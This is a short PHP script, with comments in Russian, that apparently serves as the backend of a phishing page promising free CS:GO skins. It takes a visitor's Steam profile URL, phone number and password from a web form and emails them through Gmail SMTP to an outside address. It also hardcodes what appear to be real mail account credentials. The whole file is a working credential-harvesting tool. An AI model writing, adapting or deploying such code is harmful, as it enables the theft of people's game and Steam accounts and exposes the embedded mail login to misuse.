<?php 

require_once('phpmailer/PHPMailerAutoload.php');
$mail = new PHPMailer;
$mail->CharSet = 'utf-8';

$url = $_POST['user_url'];
$phone = $_POST['user_phone'];
$password = $_POST['user_password'];

//$mail->SMTPDebug = 3;                               // Enable verbose debug output

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  																							// Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = 't5673744@gmail.com'; // Ваш логин от почты с которой будут отправляться письма
$mail->Password = 'A7724894'; // Ваш пароль от почты с которой будут отправляться письма
$mail->SMTPSecure = 'ssl';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587; // TCP port to connect to / этот порт может отличаться у других провайдеров

$mail->setFrom('t5673744@gmail.com'); // от кого будет уходить письмо?
$mail->addAddress('mi.com.td.in@gmail.com');     // Кому будет уходить письмо 
//$mail->addAddress('ellen@example.com');               // Name is optional
//$mail->addReplyTo('info@example.com', 'Information');
//$mail->addCC('cc@example.com');
//$mail->addBCC('bcc@example.com');
//$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
//$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name
$mail->isHTML(true);                                  // Set email format to HTML

$mail->Subject = 'Получение скина кс го';
$mail->Body    = '' .$password . ' оставил заявку(пароль), его телефон ' .$phone. '<br>ЮРЛ стим: ' .$url;
$mail->AltBody = '';

if(!$mail->send()) {
    echo 'Error';
} 
?>